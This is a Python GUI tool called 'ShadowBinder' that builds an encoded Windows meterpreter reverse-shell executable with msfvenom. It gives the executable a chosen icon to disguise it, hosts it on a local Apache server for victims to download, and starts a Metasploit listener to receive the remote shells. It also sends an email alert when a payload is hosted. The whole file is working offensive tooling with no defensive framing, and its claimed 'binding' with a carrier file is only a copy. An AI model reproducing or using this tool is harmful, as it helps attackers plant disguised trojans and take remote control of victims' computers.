import os
import socket
import shutil
import tkinter as tk
from tkinter import filedialog, messagebox

try:
    from PIL import Image, ImageTk
    print("Pillow module (PIL) loaded successfully!")
except ImportError:
    print("[-] Pillow module is not installed. Please run:")
    print("    sudo apt install python3-pil python3-pil.imagetk -y")
    exit(1)

import json
import smtplib
from email.mime.text import MIMEText

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def send_email_alert(message):
    try:
        with open("email_config.json") as f:
            config = json.load(f)
        msg = MIMEText(message)
        msg["Subject"] = "ShadowBinder: New Session Alert"
        msg["From"] = config["sender_email"]
        msg["To"] = config["recipient_email"]

        server = smtplib.SMTP(config["smtp_server"], config["smtp_port"])
        server.starttls()
        server.login(config["sender_email"], config["sender_password"])
        server.send_message(msg)
        server.quit()
        print("[+] Email alert sent.")
    except Exception as e:
        print("[-] Email error:", e)

def select_file():
    path = filedialog.askopenfilename(title="Select File", filetypes=[("All Files", "*.*")])
    file_entry.delete(0, tk.END)
    file_entry.insert(0, path)

def select_icon():
    path = filedialog.askopenfilename(title="Select Icon File", filetypes=[("Icon Files", "*.ico")])
    icon_entry.delete(0, tk.END)
    icon_entry.insert(0, path)

def generate_payload():
    lhost = lhost_entry.get()
    lport = lport_entry.get()
    target_file = file_entry.get()
    icon_path = icon_entry.get()
    output_name = "output.exe"
    output_path = f"/var/www/html/{output_name}"

    # Generate payload
    cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -f exe -o temp_payload.exe"
    os.system(cmd)

    # Bind payload with target file (simple rename method)
    shutil.copy("temp_payload.exe", output_path)

    # Change icon (if selected)
    if icon_path:
        os.system(f"wine rcedit.exe {output_path} --set-icon {icon_path}")

    # Start Apache
    os.system("sudo service apache2 restart")

    payload_url = f"http://{lhost}/{output_name}"
    print(f"Payload hosted at: {payload_url}")
    messagebox.showinfo("Done", f"Payload hosted at {payload_url}")
    send_email_alert(f"Payload hosted at: {payload_url}")

def start_listener():
    lhost = lhost_entry.get()
    lport = lport_entry.get()
    cmd = f'xterm -e "msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit\"" &'
    os.system(cmd)

# GUI setup
root = tk.Tk()
root.title("ShadowBinder - Payload Binding Tool")

tk.Label(root, text="LHOST:").grid(row=0, column=0, sticky="e")
lhost_entry = tk.Entry(root, width=30)
lhost_entry.grid(row=0, column=1)
lhost_entry.insert(0, get_local_ip())

tk.Label(root, text="LPORT:").grid(row=1, column=0, sticky="e")
lport_entry = tk.Entry(root, width=30)
lport_entry.grid(row=1, column=1)
lport_entry.insert(0, "4444")

tk.Label(root, text="Bind With File:").grid(row=2, column=0, sticky="e")
file_entry = tk.Entry(root, width=30)
file_entry.grid(row=2, column=1)
tk.Button(root, text="Browse", command=select_file).grid(row=2, column=2)

tk.Label(root, text="Icon File (.ico):").grid(row=3, column=0, sticky="e")
icon_entry = tk.Entry(root, width=30)
icon_entry.grid(row=3, column=1)
tk.Button(root, text="Browse", command=select_icon).grid(row=3, column=2)

tk.Button(root, text="Generate & Host Payload", command=generate_payload, bg="green", fg="white").grid(row=4, column=1, pady=10)
tk.Button(root, text="Start Listener", command=start_listener, bg="blue", fg="white").grid(row=5, column=1)

root.mainloop()
